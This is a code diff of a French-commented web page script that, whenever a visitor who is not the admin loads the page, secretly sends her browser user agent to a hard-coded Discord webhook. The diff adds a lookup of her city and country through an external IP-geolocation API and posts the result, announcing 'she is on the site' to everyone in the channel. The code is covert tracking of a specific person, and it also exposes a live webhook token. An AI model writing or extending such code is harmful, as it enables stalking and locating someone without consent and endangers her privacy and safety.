@@ -10,30 +10,60 @@
   if (!localStorage.getItem('admin_view')) {
     const webhookURL = "https://discord.com/api/webhooks/1500222826773348353/KPNKAKnthbbeUHNRlPZg8tiAGiQ6GLAM_ubxZb6jyzmYAWmPDOGssKGIbzra5Bab0Iwf";
     
-    // On récupère les détails techniques de l'appareil et du navigateur
+    // On récupère les détails techniques
     const device = navigator.userAgent;
 
-    fetch(webhookURL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        content: "@everyone 👁️ Elle est sur le site",
-        embeds: [{
-          title: "Détails de la connexion 🌸",
-          color: 0xff0000,
-          fields: [
-            {
-              name: "📱 Appareil & Navigateur",
-              value: "```" + device + "```",
-              inline: false
-            }
-          ],
-          footer: { text: "Signal détecté à l'instant" },
-          timestamp: new Date().toISOString()
-        }]
+    // On récupère la localisation via une API externe
+    fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        const locationInfo = data.city && data.country_name 
+          ? `${data.city}, ${data.country_name}` 
+          : "Localisation inconnue";
+
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: "@everyone 👁️ Elle est sur le site",
+            embeds: [{
+              title: "Détails de la connexion 🌸",
+              color: 0xff0000,
+              fields: [
+                {
+                  name: "📍 Localisation",
+                  value: "```" + locationInfo + "```",
+                  inline: false
+                },
+                {
+                  name: "📱 Appareil & Navigateur",
+                  value: "```" + device + "```",
+                  inline: false
+                }
+              ],
+              footer: { text: "Signal détecté à l'instant" },
+              timestamp: new Date().toISOString()
+            }]
+          })
+        });
       })
-    })
-    .catch(err => console.error('Erreur ping'));
+      .catch(err => {
+        // Si la localisation échoue, on envoie quand même le ping de base
+        console.error('Erreur localisation, envoi du ping simple');
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: "@everyone 👁️ Elle est sur le site (Localisation échouée)",
+            embeds: [{
+              title: "Détails de la connexion 🌸",
+              color: 0xff0000,
+              fields: [{ name: "📱 Appareil", value: "```" + device + "```" }],
+              timestamp: new Date().toISOString()
+            }]
+          })
+        });
+      });
   }
 </script>
 <body>
